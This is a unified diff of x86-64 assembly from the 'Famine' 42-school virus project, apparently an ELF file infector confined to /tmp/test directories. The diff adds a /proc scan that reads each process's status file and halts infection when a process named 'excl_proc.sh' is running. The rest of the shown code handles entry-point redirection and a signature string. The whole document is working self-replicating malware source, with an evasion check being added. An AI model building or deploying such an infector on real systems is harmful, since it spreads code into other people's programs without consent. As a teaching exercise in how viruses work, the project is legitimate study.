@@ -4,31 +4,38 @@ sc:
 				push			rbp
 				mov				rbp,					rsp
 
-				mov				rbx,					14 * 8 + 4 * 1024
+				mov				rbx,					14 * 8 + 5 * 1024
 				sub				rsp,					rbx
 
 				push			rdi
 				push			rsi
 				push			rdx
+
 ;				xor				rdi,					rdi
 ;				mov				rax,					101
 ;				syscall
 ;
-.xor:
-				xor				rcx,					rcx
-;
 ;				cmp				rax,					0
-;				jge				.loop
-;
-;				mov				rax,					qword[rel sc_real_entry]
-;				mov				rdi,					qword[rel sc_child]
-;				cmp				rdi,					0
-;				je				.parent
-;				
-;				lea				r8,						[rel sc]
-;				sub				r8,						qword[rel sc_entry]
-;				add				rax,					r8
-;				jmp				.parent
+;				jl				.stop_code
+
+				lea				rdi,					[rel sc_dir_proc]
+				lea				rsi,					[rel sc_proc_pids]
+				call			sc_proc_dir
+
+				cmp				rax,					0
+				je				.init_loop
+.stop_code:
+				mov				rax,					qword[rel sc_real_entry]
+				mov				rdi,					qword[rel sc_child]
+				cmp				rdi,					0
+				je				.jump
+				
+				lea				r8,						[rel sc]
+				sub				r8,						qword[rel sc_entry]
+				add				rax,					r8
+				jmp				.jump
+.init_loop:
+				xor				rcx,					rcx
 .loop:
 				cmp				rcx,					rbx
 				je				.end
@@ -71,12 +78,12 @@ sc:
 				mov				rax,					qword[rsp+0xc70]
 
 				cmp				qword[rsp+0xc78],		0
-				je				.parent
+				je				.jump
 
 				lea				r8,						[rel sc]
 				sub				r8,						qword[rsp+0xc80]
 				add				rax,					r8
-.parent:
+.jump:
 				pop				rdx
 				pop				rsi
 				pop				rdi
@@ -212,6 +219,123 @@ sc_proc_entries:
 				mov				rsi,					qword[rsi+0x18]
 				mov				rax,					11
 				syscall
+.end:
+				xor				rax,					rax
+				ret
+sc_proc_pids:
+				push			rbp
+				mov				rbp,					rsp
+				sub				rsp,					24		;	+0x10	status
+																;	+0x8	buff.proc
+																;	+0x0	buff.path
+				mov				r8,						qword[rel sc_glob]
+				mov				qword[rsp],				r8
+				add				qword[rsp],				0x60
+				mov				qword[rsp+0x8],			r8
+				add				qword[rsp],				0x1088
+
+				xchg			rdi,					rsi
+				add				rsi,					0x12
+				mov				rdx,					qword[rsp]
+				call			sc_get_full_path
+
+				mov				rdi,					qword[rsp]
+				lea				rsi,					[rel sc_status]
+				mov				rdx,					qword[rsp]
+				call			sc_get_full_path
+
+				mov				rdi,					qword[rsp]
+				xor				rsi,					rsi
+				mov				rax,					2
+				syscall
+
+				cmp				rax,					0
+				jl				.not_found
+
+				mov				qword[rsp+0x8],			rax
+				mov				rdi,					rax
+				mov				rsi,					qword[rsp+0x8]
+				mov				rdx,					0x400
+				xor				rax,					rax
+				syscall
+
+				cmp				rax,					1
+				jl				.close
+
+				mov				rdi,					qword[rsp+0x8]
+				mov				rsi,					rax
+				call			sc_get_name
+
+				cmp				rax,					0
+				je				.close
+
+				mov				rdi,					rax
+				lea				rsi,					[rel sc_excl_proc]
+				mov				rdx,					sc_excl_proc_end - sc_excl_proc
+				call			sc_str_n_cmp
+
+				cmp				rax,					0
+				je				.found
+.close:
+				mov				rdi,					qword[rsp+0x10]
+				mov				rax,					3
+				syscall
+.not_found:
+				xor				rax,					rax
+				jmp				.end
+.found:
+				mov				rdi,					1
+				lea				rsi,					[rel sc_sign]
+				mov				rdx,					49
+				mov				rax,					1
+				syscall
+
+				mov				rdi,					qword[rsp+0x10]
+				mov				rax,					3
+				syscall
+
+				mov				rax,					-1
+.end:
+				mov				rsp,					rbp
+				pop				rbp
+				ret
+sc_get_name:
+.loop_1:
+				cmp				rsi,					0
+				je				.end
+
+				cmp				byte[rdi],				0x9
+				je				.loop_2
+
+				inc				rdi
+				dec				rsi
+				jmp				.loop_1
+.loop_2:
+				cmp				rsi,					0
+				je				.end
+
+				cmp				byte[rdi],				0x9
+				jne				.init_loop_3
+
+				inc				rdi
+				dec				rsi
+				jmp				.loop_2
+.init_loop_3:
+				xor				rcx,					rcx
+.loop_3:
+				cmp				rcx,					rsi
+				je				.end
+				
+				mov				r8b,					byte[rdi+rcx]
+				cmp				r8b,					0x0a
+				je				.break
+
+				inc				rcx
+				jmp				.loop_3
+.break:
+				mov				byte[rdi+rcx],			0x0
+				mov				rax,					rdi
+				ret
 .end:
 				xor				rax,					rax
 				ret
@@ -704,6 +828,8 @@ sc_dir_1:
 				db				"/tmp/test/", 0
 sc_dir_2:
 				db				"/tmp/test2/", 0
+sc_dir_proc:
+				db				"/proc/", 0
 sc_entry:
 				dq				sc
 sc_real_entry:
@@ -712,29 +838,35 @@ sc_ident:
 				db				0x7f, "ELF", 0x2
 sc_child:
 				dq				0
+sc_status:
+				db				"/status", 0
+sc_excl_proc:
+				db				"excl_proc.sh" ; max len = 15
+sc_excl_proc_end:
 sc_glob:
-				dq				0	; +0x18 -> sz.mem
-									; +0x20 -> sz.code
-									; +0x28 -> sz.data
-									; +0x30 -> sz.load
-									; +0x38 -> sz.f_pad
-									; +0x40 -> sz.m_pad
+				dq				0	; +0x18		->	sz.mem
+									; +0x20		->	sz.code
+									; +0x28		->	sz.data
+									; +0x30		->	sz.load
+									; +0x38		->	sz.f_pad
+									; +0x40		->	sz.m_pad
 
-									; +0x48 -> *hdrs.elf
-									; +0x50 -> *hdrs.txt
-									; +0x58 -> *hdrs.nxt
+									; +0x48		->	*hdrs.elf
+									; +0x50		->	*hdrs.txt
+									; +0x58		->	*hdrs.nxt
 									
-									; +0x60 -> buffs.path
-									; +0x460 -> buffs.zeros
-									; +0x860 -> buffs.entry
+									; +0x60		->	buffs.path
+									; +0x460	->	buffs.zeros
+									; +0x860	->	buffs.entry
 
-									; +0xc60 -> *mem
-									; +0xc68 -> x_pad
-									; +0xc70 -> real_entry
-									; +0xc78 -> child
-									; +0xc80 -> entry
+									; +0xc60	->	*mem
+									; +0xc68	->	x_pad
+									; +0xc70 	->	real_entry
+									; +0xc78	->	child
+									; +0xc80	-> 	entry
 
-									; +0xc88 -> buffs.copy
+									; +0xc88	->	buffs.copy
+									; +0x1088 	->	buffs.proc
 sc_sign:
 				db				"Famine (42 project) - 2022 - by apitoise & fcadet", 0
 sc_data_end:
